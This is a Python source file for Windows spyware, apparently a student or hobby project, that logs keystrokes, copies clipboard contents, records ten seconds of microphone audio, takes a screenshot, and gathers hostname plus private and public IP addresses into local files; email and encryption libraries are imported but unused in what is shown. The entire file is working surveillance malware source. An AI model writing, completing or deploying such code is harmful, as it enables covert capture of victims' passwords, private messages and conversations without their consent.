#Libraries
#Email Functionality
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
#Information collection
import socket
import platform
#Clipboard
import win32clipboard
#To capture keys
from pynput.keyboard import Key,Listener
#To capture time
import time
import os
#For microphone functionality
from scipy.io.wavfile import write
import sounddevice as sd
#For file encryption
from cryptography.fernet import Fernet
#To get username and computer information
import getpass
from requests import get
#For Screenshots
from multiprocessing import Process,freeze_support
from PIL import ImageGrab

keys_information = "keylog.txt"#file to store keys captured
system_information = "syseminfo.txt"#System info
clipboard_information = "clipboard.txt"#Clipboard data
audio_information = "audio.wav"#Record and store mic data
screenshot_information = "screenshot.png"#Screenshot

file_path="C:\\Users\\admin\\OneDrive\\Desktop\\BITS\\BITSKrieg\\"
microphone_time=10
# get the computer information
def computer_information():
    with open(file_path + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip)

        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query")

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")
# get the clipboard contents
def copy_clipboard():
    with open(file_path + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)

        except:
            f.write("Clipboard could be not be copied")
# get the microphone
def microphone():
    fs = 44100
    seconds = microphone_time

    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()

    write(file_path + audio_information, fs, myrecording)
# get screenshots
def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + screenshot_information)
count = 0
keys =[]
currentTime=time.time()
SSTime=time.time()+10
StoppingTime=time.time()+15
def on_press(key):#Used to record keys being pressed till iteration ends and adds those to list
    global keys, count, currentTime

    print(key)
    keys.append(key)
    currentTime=time.time()
    count += 1

    """ if count >= 1:#rather than a huge list,refreshes list for each character
        count = 0
        write_file(keys)
        keys =[] """

def write_file(keys):#Writes list of characters pressed into file
    with open(file_path + keys_information, "a") as f:
        for key in keys:
            if key == Key.space:
                f.write('\n')
            elif key == Key.backspace:
                f.write('\b')
            else:
                k = str(key).replace("'", "")
                f.write(k)

def on_release(key):#returning false will exit keylogger 
    if key == Key.esc:
        write_file(keys)
        return False
    if currentTime> StoppingTime:
        write_file(keys)
        return False
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
    if currentTime==SSTime:
        screenshot()
copy_clipboard()
computer_information()
microphone()

